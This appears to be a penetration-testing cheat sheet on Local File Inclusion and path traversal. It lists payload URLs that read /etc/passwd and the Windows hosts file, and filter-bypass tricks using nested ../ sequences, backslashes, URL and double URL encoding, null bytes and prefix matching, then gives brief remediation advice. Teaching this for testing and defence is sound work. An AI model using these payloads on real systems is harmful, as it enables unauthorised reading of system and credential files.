# Local File Inclusion

Also known as LFI, when an attacker can get a website to include a file that was not intended to be an option for the application.

Following, we find some ways to leverage this vulnerability:

* Check if parameters in the URL receive the name of a file

{% code overflow="wrap" lineNumbers="true" %}
```bash
#It's searching for a file
http://$url/$query?$param=hola.php
#We can try to access the system files
http://$url/$query?$param=/etc/passwd
```
{% endcode %}

***

* When it doesn't work directly, we can try to get to the root folder. This method is also known as _Path Traversal_.

{% tabs %}
{% tab title="On Linux server" %}
{% code overflow="wrap" lineNumbers="true" %}
```bash
#We use ../ to get to the root directory
http://$url/$query?$param=../../../../../etc/passwd
```
{% endcode %}
{% endtab %}

{% tab title="On Windows server" %}
{% code overflow="wrap" lineNumbers="true" %}
```bash
#We use ../ to get to the root directory
http://$url/$query?$param=../../../../../../WINDOWS/system32/drivers/etc/hosts
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="info" %}
It is useful to put as many `../` as possible to get to the root folder
{% endhint %}

***

* Sometimes, we will need to check the page code to see the input conditions.

{% tabs %}
{% tab title="Case 1" %}
The code is searching for a file whose name starts with _file_

{% code title="Example source code" lineNumbers="true" %}
```php
...
$file = str_replace( array( "../", "..\\" ), "", $file );
...
```
{% endcode %}

We can use the `\` to bypass this verification

{% code lineNumbers="true" %}
```bash
http://$url/$query?$param=..\/..\/..\/..\/etc/passwd
```
{% endcode %}

Also if we use `..././` the code will do the replacement and leave us anyway with `../`, and we will also bypass this verification

{% code lineNumbers="true" %}
```bash
http://$url/$query?$param=..././..././..././..././etc/passwd
http://$url/$query?$param=....//....//....//etc/passwd
```
{% endcode %}
{% endtab %}

{% tab title="Case 2" %}
The code is searching for a file whose name starts with _file_

{% code title="Example source code" overflow="wrap" lineNumbers="true" %}
```php
...
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
...
```
{% endcode %}

We can set our input to start with a specific name or route to folder, to bypass this verification

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">http://$url/$query?$param=file/../../../../etc/passwd
<strong>http://$url/$query?$param=/var/www/images/../../../../etc/passwd
</strong></code></pre>
{% endtab %}

{% tab title="Case 3" %}
When stripped any directory traversal sequences, we can URL encode, or even double URL encode, the `../` characters

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/$query?$param=../../../etc/passwd #This don't work
http://$url/$query?$param=..%2f..%2f..%2fetc%2fpasswd #But this could
http://$url/$query?$param=..%252f..%252f..%252fetc%252fpasswd #Or even this
```
{% endcode %}
{% endtab %}

{% tab title="Case 4" %}
If needed to end with an expected file extension, we can use a null byte (`%00`) to bypass it

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/$query?$param=../../../etc/passwd%00.png   #Example
```
{% endcode %}
{% endtab %}
{% endtabs %}

## <mark style="color:blue;">Remediation Actions</mark>

* Avoid passing user-supplied input to filesystem APIs
  * Validate the user input before processing it, for example, compare the user input with a whitelist of permitted values
* Sanitize input by allowing only expected characters like alphanumeric only, no dots, slashes, or protocols
* Ensure proper file path resolution and canonicalize the path
